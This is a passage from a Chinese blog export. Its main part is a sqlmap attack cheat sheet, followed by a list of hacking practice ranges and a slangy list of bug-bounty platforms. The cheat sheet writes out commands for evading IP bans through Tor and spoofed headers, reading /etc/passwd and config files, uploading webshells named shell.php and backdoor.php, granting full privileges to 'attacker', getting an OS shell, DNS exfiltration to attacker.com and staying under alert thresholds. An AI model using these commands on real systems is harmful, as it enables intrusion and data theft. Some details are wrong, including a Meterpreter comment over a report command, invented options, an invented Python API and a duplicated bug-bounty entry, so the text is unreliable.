<h3 id="绕过IP封禁限制"><a href="#绕过IP封禁限制" class="headerlink" title="绕过IP封禁限制"></a>绕过IP封禁限制</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用代理池轮换IP</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --proxy=&quot;socks5://127.0.0.1:9050&quot; --random-agent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">伪造XFF头绕过封禁</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --headers=&quot;X-Forwarded-For: $(shuf -n 1 ips.txt)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="提取二进制文件"><a href="#提取二进制文件" class="headerlink" title="提取二进制文件"></a>提取二进制文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取服务器文件</span></span><br><span class="line">sqlmap -u &quot;http://target.com/vuln.php?id=1&quot; --file-read=&quot;/etc/passwd&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传文件到服务器</span></span><br><span class="line">sqlmap -u &quot;http://target.com/vuln.php?id=1&quot; --file-write=&quot;shell.php&quot; --file-destination=&quot;/var/www/html/shell.php&quot;</span><br></pre></td></tr></table></figure>

<h3 id="数据库权限提升"><a href="#数据库权限提升" class="headerlink" title="数据库权限提升"></a>数据库权限提升</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检测当前用户权限</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --is-dba</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行SQL命令提升权限</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --sql-query=&quot;GRANT ALL PRIVILEGES ON *.* TO &#x27;attacker&#x27;@&#x27;%&#x27;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="自动化爬虫与漏洞发现"><a href="#自动化爬虫与漏洞发现" class="headerlink" title="自动化爬虫与漏洞发现"></a>自动化爬虫与漏洞发现</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自动爬取并测试整个网站</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --crawl=3 --batch --forms</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅测试特定目录</span></span><br><span class="line">sqlmap -u &quot;http://target.com/admin/&quot; --crawl=1 --batch</span><br></pre></td></tr></table></figure>

<h3 id="加密通信下的注入"><a href="#加密通信下的注入" class="headerlink" title="加密通信下的注入"></a>加密通信下的注入</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试HTTPS站点（忽略证书错误）</span></span><br><span class="line">sqlmap -u &quot;https://target.com&quot; --batch --ignore-ssl-errors</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试需认证的API</span></span><br><span class="line">sqlmap -u &quot;https://api.target.com&quot; --auth-type=Basic --auth-cred=&quot;user:pass&quot;</span><br></pre></td></tr></table></figure>

<h3 id="提取特定表数据"><a href="#提取特定表数据" class="headerlink" title="提取特定表数据"></a>提取特定表数据</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出指定数据库的所有表</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; -D users --tables</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转储特定表中的数据</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; -D users -T passwords --dump</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二进制数据转储技术</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--hex：将二进制字段（如图片、证书）转为十六进制导出</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --dump -T users -C password --hex</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分批次大数据提取</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--start/--stop：分段提取数据（避免单次请求过大触发警报）</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --dump -D dbname --start=1000 --stop=2000</span><br></pre></td></tr></table></figure>

<h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取OS Shell（需DBA权限）</span></span><br><span class="line">sqlmap -u &quot;http://target.com/vuln.php?id=1&quot; --os-shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行单个系统命令</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --os-cmd=&quot;id&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">操作系统命令执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-os-cmd：执行系统命令（需DB高权限）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--priv-esc：尝试数据库提权</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --os-cmd=&quot;whoami&quot; --priv-esc</span><br></pre></td></tr></table></figure>

<h3 id="绕过JavaScript验证"><a href="#绕过JavaScript验证" class="headerlink" title="绕过JavaScript验证"></a>绕过JavaScript验证</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">携带特定请求头绕过JS验证</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --headers=&quot;X-Requested-With: XMLHttpRequest&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自定义请求体格式</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --data=&quot;json=&#123;\&quot;id\&quot;:1&#125;&quot; --batch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">伪静态URL注入处理</span></span><br><span class="line">sqlmap -u &quot;http://site.com/article/123*.html&quot; --prefix=&quot;&#x27;)&quot; --suffix=&quot;-- -&quot;</span><br></pre></td></tr></table></figure>

<h3 id="提取敏感配置"><a href="#提取敏感配置" class="headerlink" title="提取敏感配置"></a>提取敏感配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提取数据库配置文件</span></span><br><span class="line">sqlmap -u &quot;http://target.com/vuln.php?id=1&quot; --file-read=&quot;/var/www/config.php&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取环境变量</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --sql-query=&quot;SHOW ENVIRONMENT VARIABLES&quot;</span><br></pre></td></tr></table></figure>

<h3 id="利用DNS外带数据"><a href="#利用DNS外带数据" class="headerlink" title="利用DNS外带数据"></a>利用DNS外带数据</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DNS盲注（需控制DNS服务器）</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --dns-domain=&quot;attacker.com&quot; --technique=E</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提取数据到DNS日志</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --sql-query=&quot;SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;)&quot; --dns-domain=&quot;attacker.com&quot;</span><br></pre></td></tr></table></figure>

<h3 id="自定义预处理与后处理"><a href="#自定义预处理与后处理" class="headerlink" title="自定义预处理与后处理"></a>自定义预处理与后处理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">请求预处理（添加动态令牌）</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --preprocess=token_gen.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">响应后处理（提取敏感信息）</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --postprocess=extract_info.py</span><br></pre></td></tr></table></figure>

<h3 id="利用SQLMap的API模式"><a href="#利用SQLMap的API模式" class="headerlink" title="利用SQLMap的API模式"></a>利用SQLMap的API模式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python调用SQLMap API示例</span></span><br><span class="line"><span class="keyword">import</span> sqlmapapi</span><br><span class="line"></span><br><span class="line">api = sqlmapapi.SQLMapAPI()</span><br><span class="line">task_id = api.start_task()</span><br><span class="line">api.set_option(task_id, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://target.com/vuln.php?id=1&quot;</span>)</span><br><span class="line">api.set_option(task_id, <span class="string">&quot;batch&quot;</span>, <span class="literal">True</span>)</span><br><span class="line">api.start_scan(task_id)</span><br></pre></td></tr></table></figure>

<h3 id="隐蔽式渗透测试"><a href="#隐蔽式渗透测试" class="headerlink" title="隐蔽式渗透测试"></a>隐蔽式渗透测试</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">层级式Payload探测</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--level：提升检测深度（1-5级），5级检测Cookie/X-Forwarded-For等头部</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--risk：风险等级（1-3级），3级启用堆叠查询等高风险操作</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --level=5 --risk=3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">降低检测风险的慢速模式</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --risk=1 --level=1 --slow-clean</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">伪造正常用户行为</span></span><br><span class="line">sqlmap -u &quot;http://target.com&quot; --random-agent --safe-url=&quot;http://target.com/index.html&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">多级代理链隐匿扫描</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过Tor或多层代理池隐藏源IP</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --proxy=&quot;socks5://127.0.0.1:9050&quot; --proxy-cred=&quot;user:pass&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">伪流量混淆技术</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--null-connection：仅获取响应长度（不返回页面内容）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--invalid-bignum：将参数转为大整数（绕过简单数字型WAF）</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --null-connection --invalid-bignum</span><br></pre></td></tr></table></figure>

<h3 id="CSRF-Token动态处理"><a href="#CSRF-Token动态处理" class="headerlink" title="CSRF Token动态处理"></a>CSRF Token动态处理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自动从指定URL获取并更新CSRF Token</span></span><br><span class="line">sqlmap -u &quot;http://site.com/form&quot; --csrf-token=&quot;token_name&quot; --csrf-url=&quot;http://site.com/get_token&quot;</span><br></pre></td></tr></table></figure>

<h3 id="JSON格式注入点检测"><a href="#JSON格式注入点检测" class="headerlink" title="JSON格式注入点检测"></a>JSON格式注入点检测</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定JSON格式数据，自动识别注入点</span></span><br><span class="line">sqlmap -u &quot;http://site.com/api&quot; --data=&#x27;&#123;&quot;id&quot;:1&#125;&#x27; --headers=&quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure>

<h3 id="文件系统交互"><a href="#文件系统交互" class="headerlink" title="文件系统交互"></a>文件系统交互</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读写服务器文件（依赖数据库文件操作权限）</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --file-read=&quot;/etc/passwd&quot;</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --file-write=&quot;backdoor.php&quot; --file-dest=&quot;/var/www/&quot;</span><br></pre></td></tr></table></figure>

<h3 id="UDF注入提权"><a href="#UDF注入提权" class="headerlink" title="UDF注入提权"></a>UDF注入提权</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注入自定义函数库（适用于MySQL/PostgreSQL提权）</span></span><br><span class="line">sqlmap -u &quot;http://site.com?id=1&quot; --udf-inject --shared-lib=&quot;/tmp/lib.so&quot;</span><br></pre></td></tr></table></figure>

<h3 id="自动化报告生成"><a href="#自动化报告生成" class="headerlink" title="自动化报告生成"></a>自动化报告生成</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接获取Meterpreter会话（需Metasploit框架支持）</span></span><br><span class="line"> sqlmap -u &quot;http://site.com?id=1&quot; --dump --output-dir=/reports --report=report.html</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker总结二【靶场推荐】</title>
    <url>/cnblogs.github.io/p/b2aa.html</url>
    <content><![CDATA[<h3 id="cyberstrikelab"><a href="#cyberstrikelab" class="headerlink" title="cyberstrikelab"></a>cyberstrikelab</h3><blockquote>
<p>网址：<a href="https://www.cyberstrikelab.com/">https://www.cyberstrikelab.com/</a></p>
</blockquote>
<p>CyberStrikeLab 是一个专注于网络安全的在线仿真实战平台，由经验丰富的红队人员打造，以实战、系统、便利为特色，其靶机根据多年实战案例搭建，能帮助学习者提升网络安全实战技能。</p>
<h3 id="hackthebox"><a href="#hackthebox" class="headerlink" title="hackthebox"></a>hackthebox</h3><blockquote>
<p>网址：<a href="https://app.hackthebox.com/">https://app.hackthebox.com/</a></p>
</blockquote>
<p>Hack The Box 是一个国际知名的网络安全渗透测试实战靶场平台，提供在线的渗透测试环境与挑战，帮助网络安全学习者与从业者提升实战技能。</p>
<h3 id="hackmyvm"><a href="#hackmyvm" class="headerlink" title="hackmyvm"></a>hackmyvm</h3><blockquote>
<p>网址：<a href="https://hackmyvm.eu/">https://hackmyvm.eu/</a></p>
</blockquote>
<p>HackMyVM 是一个国际性的网络安全靶场平台，提供多种虚拟机镜像靶机，用户可使用 VMware 或 VirtualBox 运行，挑战目标是获取操作系统的 root 权限和查看 flag。其靶机涵盖从入门到高阶的难度，适合不同水平的渗透测试爱好者学习与练习。</p>
<h3 id="Root-Me"><a href="#Root-Me" class="headerlink" title="Root Me"></a>Root Me</h3><blockquote>
<p>网址：<a href="https://www.root-me.org/">https://www.root-me.org/</a></p>
</blockquote>
<p>Root Me 是一个国际知名且免费的在线网络安全学习平台，提供CTF风格的网络安全挑战，涵盖密码学、WEB、脚本、网络、编程等内容的靶场，适合中高级学习者。</p>
<h3 id="Try-Hack-Me"><a href="#Try-Hack-Me" class="headerlink" title="Try Hack Me"></a>Try Hack Me</h3><blockquote>
<p>网址：<a href="https://tryhackme.com/">https://tryhackme.com/</a></p>
</blockquote>
<p>Try Hack Me 是一个适合初学者的在线网络安全学习平台，提供结构化的课程、实战靶场和 CTF 挑战，帮助用户提升从基础到高级的网络安全技能。包括windows和linux的靶场渗透。</p>
<h3 id="vulfocus"><a href="#vulfocus" class="headerlink" title="vulfocus"></a>vulfocus</h3><blockquote>
<p>网址：<a href="https://vulfocus.cn/">https://vulfocus.cn/</a></p>
</blockquote>
<p>Vulfocus 是一个漏洞集成平台，将漏洞环境 docker 镜像放入即可使用，开箱即用，可用于漏洞复现、POC 验证、EXP 验证等，它由白帽汇推出，本质上是一个漏洞靶场。</p>
<h3 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h3><blockquote>
<p>网址：<a href="https://github.com/vulhub/">https://github.com/vulhub/</a></p>
</blockquote>
<p>vulhubVulhub 是一个开源的漏洞靶场项目，基于 Docker 和 Docker-Compose 技术，提供一系列预构建的漏洞环境，用户可以快速搭建和测试各种漏洞场景，适合中高级学习者进行漏洞复现和研究</p>
<h3 id="vulnhub"><a href="#vulnhub" class="headerlink" title="vulnhub"></a>vulnhub</h3><blockquote>
<p>网址：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p>
</blockquote>
<p>和hackmyvm类似，是一个开源漏洞靶场项目，基于 Docker 和 Docker-compose 技术，提供一系列预构建的漏洞环境，用户可快速搭建和测试各种漏洞场景，适合中高级学习者进行漏洞复现和研究。</p>
<h3 id="XCTF攻防世界"><a href="#XCTF攻防世界" class="headerlink" title="XCTF攻防世界"></a>XCTF攻防世界</h3><blockquote>
<p>网址：<a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a></p>
</blockquote>
<p>XCTF 攻防世界是一个专注于网络安全的在线平台，提供大量高质量的 CTF 题目和实训环境，适合不同水平的学习者提升实战技能。</p>
<h3 id="XSS小游戏"><a href="#XSS小游戏" class="headerlink" title="XSS小游戏"></a>XSS小游戏</h3><blockquote>
<p>网址：<a href="https://xss.haozi.me/#/">https://xss.haozi.me/#/</a></p>
</blockquote>
<p>xss学习必备的小游戏</p>
<h3 id="墨者学院"><a href="#墨者学院" class="headerlink" title="墨者学院"></a>墨者学院</h3><blockquote>
<p>网址：<a href="https://www.mozhe.cn/">https://www.mozhe.cn/</a></p>
</blockquote>
<p>墨者学院是一个专业的网络安全在线靶场平台，专注于实战技能培养，适合网络安全学习者提升攻防能力。</p>
<h3 id="封神台"><a href="#封神台" class="headerlink" title="封神台"></a>封神台</h3><blockquote>
<p>网址：<a href="https://hack.zkaq.cn/">https://hack.zkaq.cn/</a></p>
</blockquote>
<p>封神台是掌控安全推出的一个在线攻防演练靶场，专注于网络安全渗透测试演练，适合网络安全学习者和从业者进行实战技能提升</p>
<h3 id="春秋云镜"><a href="#春秋云镜" class="headerlink" title="春秋云镜"></a>春秋云镜</h3><blockquote>
<p><a href="https://yunjing.ichunqiu.com/">https://yunjing.ichunqiu.com/</a></p>
</blockquote>
<p>春秋云镜是一个专注于实战化的网络安全攻防演练靶场平台，提供了多样化的漏洞环境和场景，以帮助用户提升网络安全技能和攻防实战能力。</p>
<h3 id="玄机靶场"><a href="#玄机靶场" class="headerlink" title="玄机靶场"></a>玄机靶场</h3><blockquote>
<p><a href="https://xj.edisec.net/">https://xj.edisec.net/</a></p>
</blockquote>
<p>玄机靶场是一个专业的网络安全实验平台，提供多样化的攻击场景库和丰富的题库，涵盖渗透测试、应急响应、CTF竞赛等领域，适合不同层次的学习者进行实战训练，提升网络安全技能。</p>
<h3 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h3><blockquote>
<p><a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></p>
</blockquote>
<p>红日靶场是一个由红日安全团队打造的网络安全靶场平台，其特点是提供模拟真实企业内网的环境，涵盖域控、黄金票据等高级内网渗透场景，适合具备一定基础的学习者进行实战训练。靶场通过虚拟机镜像形式提供，需本地部署使用</p>
<h3 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h3><blockquote>
<p><a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a></p>
</blockquote>
<p>CTFHub 是一个专注于信息安全竞赛的在线学习平台，提供题目练习、赛事跟踪等服务，适合 CTF 爱好者学习和提升技能。</p>
<h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><blockquote>
<p><a href="https://ctf.show/">https://ctf.show/</a></p>
</blockquote>
<p>CTFShow 是一个在线的网络安全学习平台，提供丰富的 CTF 题目和解题思路，适合 CTF 爱好者学习和提升技能。</p>
<h3 id="AltoroJ"><a href="#AltoroJ" class="headerlink" title="AltoroJ"></a>AltoroJ</h3><blockquote>
<p><a href="https://demo.testfire.net/">https://demo.testfire.net/</a></p>
</blockquote>
<p>AltoroJ 是一个开源的银行应用程序，用于展示 Web 应用安全漏洞，适合网络安全学习者进行安全测试和教育训练。它包含多种漏洞，如 SQL 注入、跨站脚本攻击等，旨在帮助学习者深入了解 Web 应用的安全性问题和防御策略。</p>
<h3 id="vulnweb"><a href="#vulnweb" class="headerlink" title="vulnweb"></a>vulnweb</h3><blockquote>
<p><a href="http://vulnweb.com/">http://vulnweb.com/</a></p>
</blockquote>
<p>Vulnweb 是一个故意设置安全漏洞的 PHP 在线商店示例，用于测试网页漏洞扫描工具和技能，如 SQL 注入、跨站脚本攻击等。它模拟真实的漏洞环境，帮助开发者、安全研究人员和学生学习常见的 Web 应用安全漏洞</p>
<h3 id="XSS-LAB"><a href="#XSS-LAB" class="headerlink" title="XSS-LAB"></a>XSS-LAB</h3><blockquote>
<p><a href="https://vuln.longyusec.com/">https://vuln.longyusec.com/</a></p>
</blockquote>
<p>xss-labs是一个专注于跨站脚本攻击（XSS）学习和测试的开源靶场，提供多种XSS漏洞场景，帮助用户理解XSS攻击原理、掌握防御技巧，并通过实践提升安全意识和技能。</p>
<h3 id="SQL-LABS"><a href="#SQL-LABS" class="headerlink" title="SQL-LABS"></a>SQL-LABS</h3><blockquote>
<p><a href="https://vuln.longyusec.com/">https://vuln.longyusec.com/</a></p>
</blockquote>
<p>sql-libs是一个专门用于学习和测试SQL注入的开源平台，它提供了一系列的注入场景和关卡，帮助开发者和安全测试人员深入理解SQL注入的原理和防范方法。通过sql-libs，用户可以实践不同类型的SQL注入攻击，并学习如何编写安全的代码来避免这些漏洞。</p>
<h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><blockquote>
<p><a href="https://vuln.longyusec.com/">https://vuln.longyusec.com/</a></p>
</blockquote>
<p>DVWA是一个用于演示网页应用安全漏洞的开源软件平台，旨在帮助安全专业人士、学生及开发者理解并学习常见安全漏洞。它模拟了多种漏洞场景，如SQL注入、XSS等，提供安全测试环境。新手必练靶场之一。</p>
<h3 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h3><blockquote>
<p><a href="https://vuln.longyusec.com/">https://vuln.longyusec.com/</a></p>
</blockquote>
<p>upload-labs是一个使用PHP语言编写的，专门用于渗透测试和CTF中遇到的各种文件上传漏洞的靶场，旨在帮助用户深入了解文件上传漏洞的原理和防范措施。它提供了一系列模拟文件上传漏洞的实验环境，每个关卡都包含着不同的上传方式和挑战。</p>
<h3 id="mutillidae"><a href="#mutillidae" class="headerlink" title="mutillidae"></a>mutillidae</h3><blockquote>
<p><a href="https://vuln.longyusec.com/">https://vuln.longyusec.com/</a></p>
</blockquote>
<p>Mutillidae 是一个免费、开源的 Web 应用程序安全漏洞靶场，由 OWASP 社区支持，包含丰富的渗透测试项目，如 SQL 注入、跨站脚本攻击、文件包含等，旨在帮助学习者理解和发现常见的 Web 应用安全问题。</p>
<h3 id="JAVA-Sec-Lab"><a href="#JAVA-Sec-Lab" class="headerlink" title="JAVA Sec Lab"></a>JAVA Sec Lab</h3><blockquote>
<p><a href="https://github.com/whgojp/JavaSecLab">https://github.com/whgojp/JavaSecLab</a></p>
</blockquote>
<p>JavaSecLab 是一款综合型 Java 漏洞平台，提供相关漏洞缺陷代码、修复代码、漏洞场景、审计 SINK 点、安全编码规范，覆盖多种漏洞场景，拥有友好用户交互 UI，适合安全研究人员、开发人员和安全服务人员学习和理解 Java 安全漏洞的生成、修复和审计过程。</p>
<h3 id="极核靶场"><a href="#极核靶场" class="headerlink" title="极核靶场"></a>极核靶场</h3><blockquote>
<p><a href="https://hackhub.get-shell.com/">https://hackhub.get-shell.com/</a></p>
</blockquote>
<p>一个不错的靶场练习平台，适合新手，提供了DVWA、sqllabs，xsslab等基础靶场</p>
<h3 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h3><blockquote>
<p><a href="https://ctfwar.org.cn/cyber-range.html">https://ctfwar.org.cn/cyber-range.html</a></p>
</blockquote>
<p>一个不错的靶场练习平台，适合新手</p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker总结五【SRC推荐】</title>
    <url>/cnblogs.github.io/p/8bae.html</url>
    <content><![CDATA[<h3 id="TSrc"><a href="#TSrc" class="headerlink" title="TSrc"></a>TSrc</h3><blockquote>
<p>网址：<a href="https://security.tencent.com/">https://security.tencent.com/</a></p>
</blockquote>
<p>腾讯安全应急响应中心（腾讯SRC）是腾讯用于收集漏洞信息的平台</p>
<h3 id="补天"><a href="#补天" class="headerlink" title="补天"></a>补天</h3><blockquote>
<p>网址：<a href="https://www.butian.net/">https://www.butian.net/</a></p>
</blockquote>
<p>补天漏洞响应平台旨在建立企业与白帽子之间的桥梁，帮助企业建立SRC(安全应急响应中心)，让企业更安全，让白帽子获益。</p>
<h3 id="360src"><a href="#360src" class="headerlink" title="360src"></a>360src</h3><blockquote>
<p>网址：<a href="https://security.360.cn/">https://security.360.cn/</a></p>
</blockquote>
<p>360SRC，360安全应急响应中心，白帽子的提款机。挖洞交票，等级越高赏金越香，上不封顶。别墨迹，干就完了。</p>
<h3 id="360众测"><a href="#360众测" class="headerlink" title="360众测"></a>360众测</h3><blockquote>
<p>网址：<a href="https://zhongce.360.net/">https://zhongce.360.net/</a></p>
</blockquote>
<p>360众测，干就完了！ 这是360自家的高赏金战场，漏洞&#x3D;现金。</p>
<h3 id="58src"><a href="#58src" class="headerlink" title="58src"></a>58src</h3><blockquote>
<p>网址：<a href="https://zhongce.360.net/">https://zhongce.360.net/</a></p>
</blockquote>
<p>360众测，干就完了！ 这是360自家的高赏金战场，漏洞&#x3D;现金。</p>
<h3 id="DayDayPoc"><a href="#DayDayPoc" class="headerlink" title="DayDayPoc"></a>DayDayPoc</h3><blockquote>
<p>网址：<a href="https://www.ddpoc.com/">https://www.ddpoc.com/</a></p>
</blockquote>
<p>DayDayPoc——白帽子的“军火库”，每日投喂新鲜0day&#x2F;1day PoC，GitHub日更，关注它，今天不熬夜挖洞，明天熬夜补洞。</p>
<h3 id="Seebug"><a href="#Seebug" class="headerlink" title="Seebug"></a>Seebug</h3><blockquote>
<p>网址：<a href="https://www.seebug.org/">https://www.seebug.org/</a></p>
</blockquote>
<p>Seebug，老牌漏洞军火库，PoC&#x2F;Exp 日更，一键搜索、直接开捅，会员还能提前嫖 0day。洞不等人，上车就射。</p>
<h3 id="vivoSrc"><a href="#vivoSrc" class="headerlink" title="vivoSrc"></a>vivoSrc</h3><blockquote>
<p>网址：<a href="https://security.vivo.com.cn/#/rank/list">https://security.vivo.com.cn/#/rank/list</a></p>
</blockquote>
<p>vivoSRC——vivo官方撒钱场，漏洞换赏金，高危立结，上不封顶。每月冲榜，前10直接加钱加戏。别磨叽，干洞就完了。</p>
<h3 id="京东src"><a href="#京东src" class="headerlink" title="京东src"></a>京东src</h3><blockquote>
<p>网址：<a href="https://security.jd.com/#/index">https://security.jd.com/#/index</a></p>
</blockquote>
<p>京东SRC，东哥的红包局——漏洞&#x3D;现金，高危秒付，上不封顶；季度冲榜、实物金条、公开封神。技术够硬，钱包就肿，干！</p>
<h3 id="华为src"><a href="#华为src" class="headerlink" title="华为src"></a>华为src</h3><blockquote>
<p>网址：<a href="https://bugbounty.huawei.com/#/home">https://bugbounty.huawei.com/#/home</a></p>
</blockquote>
<p>华为SRC，菊厂赏金猎场。技术够野，钱包就鼓；干华为，没废话。</p>
<h3 id="国家信息安全漏洞共享平台"><a href="#国家信息安全漏洞共享平台" class="headerlink" title="国家信息安全漏洞共享平台"></a>国家信息安全漏洞共享平台</h3><blockquote>
<p>网址：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p>
</blockquote>
<p>CNVD，国家队漏洞库，官方唯一指定“白名单”通道。 提交原创漏洞&#x3D;拿编号、上通告、领证书； 党政机关、国央企、关基单位优先收录； 想混国家级荣誉、拿护网加分、评职称，就冲它。 洞不狠别来，来了就名垂“国史”。</p>
<h3 id="国家信息安全漏洞库"><a href="#国家信息安全漏洞库" class="headerlink" title="国家信息安全漏洞库"></a>国家信息安全漏洞库</h3><blockquote>
<p>网址：<a href="https://www.cnnvd.org.cn/home/childHome">https://www.cnnvd.org.cn/home/childHome</a></p>
</blockquote>
<p>想混国家级光环，先把洞磨成刺刀再来。</p>
<h3 id="字节跳动src"><a href="#字节跳动src" class="headerlink" title="字节跳动src"></a>字节跳动src</h3><blockquote>
<p>网址：<a href="https://src.bytedance.com/home">https://src.bytedance.com/home</a></p>
</blockquote>
<p>字节SRC，宇宙厂撒币现场。技术够骚，钱包就爆；冲字节，别怂。</p>
<h3 id="小米src"><a href="#小米src" class="headerlink" title="小米src"></a>小米src</h3><blockquote>
<p>网址：<a href="https://sec.xiaomi.com/#/">https://sec.xiaomi.com/#/</a></p>
</blockquote>
<p>小米SRC，雷军的红包雨。技术够刚，直接提车！</p>
